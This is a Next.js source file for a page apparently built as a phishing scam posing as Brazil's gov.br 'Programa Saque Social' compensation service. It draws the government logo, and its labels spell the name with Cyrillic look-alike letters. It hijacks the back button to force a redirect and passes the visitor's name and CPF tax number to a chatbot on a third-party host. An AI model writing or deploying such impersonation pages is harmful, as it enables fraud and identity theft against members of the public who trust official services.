
"use client";

import React, { useState, useEffect, Suspense } from 'react';
import Head from 'next/head';
import Image from 'next/image';
import Script from 'next/script';
import { useSearchParams, useRouter } from 'next/navigation';
import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
import '../chat-page.css'; // Styles specific to this chat page

function ChatPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [isLoading, setIsLoading] = useState(true);
  const [headerUserName, setHeaderUserName] = useState('Usuário');

  useEffect(() => {
    // Back button redirect logic (make sure /back/index.html is in public folder)
    const urlBackRedirect = '/back/index.html'; 
    const query = searchParams.toString();
    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + query;

    history.pushState({}, "", window.location.href);
    history.pushState({}, "", window.location.href);

    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);

    // Set user name from URL params
    const nomeParam = searchParams.get('nome');
    if (nomeParam) {
      setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
    }

    // Hide loading screen
    const loadingTimer = setTimeout(() => {
      setIsLoading(false);
    }, 1200);

    return () => {
      window.removeEventListener('popstate', handlePopState);
      clearTimeout(loadingTimer);
    };
  }, [searchParams]);

  useEffect(() => {
    // Initialize Typebot once the script is loaded and the component is mounted
    // The Typebot script itself will look for <typebot-standard>
    if (typeof window.Typebot !== 'undefined') {
        // Check if Typebot is already initialized for this element
        const typebotElement = document.querySelector('typebot-standard');
        if (typebotElement && !typebotElement.shadowRoot?.querySelector('.typebot-container')) { // A simple check
            window.Typebot.initStandard({
              typebot: "24lkdef", // Your Typebot ID
              apiHost: "https://chat.bestbot.info",
              // Pass prefill variables if Typebot is configured to receive them
              prefill: {
                nome: searchParams.get('nome') || '',
                cpf: searchParams.get('cpf') || '',
                // Add other params like 'mae', 'nascimento' if your Typebot uses them
              }
            });
        }
    }
  }, [searchParams]); // Rerun if searchParams change, to potentially re-init or update Typebot

  return (
    <>
      <Head>
        <title>Programa Saque Social - Atendimento</title>
        {/* Preload for Typebot script is handled by next/script, but you can add others if needed */}
      </Head>

      <Script
        src="https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.59/dist/web.js"
        strategy="afterInteractive"
        onLoad={() => {
          // console.log('Typebot script loaded');
          // Trigger re-render or effect to ensure initStandard is called
          // This is often handled by the useEffect dependency on window.Typebot or a state change
        }}
      />
      
      <div className="chat-page-body">
        {isLoading && (
          <div id="loading-screen">
            <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <title>GОV.ВR</title>
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
        )}

        <header className="chat-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User />
              <span>{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="chat-page-nav">
          <button>
            <Menu />
            <p>Benefício <span> &gt; </span> Indenização <span> &gt; </span> Atendimento</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        {/* This div will wrap and position the Typebot embed */}
        <div className="typebot-container-wrapper">
            <div className="typebot-embed-container">
                 <typebot-standard style={{ width: '100%', height: '100%' }}></typebot-standard>
            </div>
        </div>
        
        {/* The #popup div was empty in the HTML, can be used if needed later */}
        {/* <div id="popup"></div> */}

        <footer className="chat-page-footer">
          <Image 
            src="https://i.imgur.com/919uhHG.png" // Using a known working logo
            alt="Rodapé Logo" 
            width={150} 
            height={40} 
            className="footer-logo"
            data-ai-hint="company logo"
            priority={false}
          />
        </footer>
      </div>
    </>
  );
}


export default function ChatPage() {
  return (
    <Suspense fallback={
      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
          <title>GОV.ВR</title> 
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
          </text> 
        </svg> 
      </div>
    }>
      <ChatPageContent />
    </Suspense>
  );
}
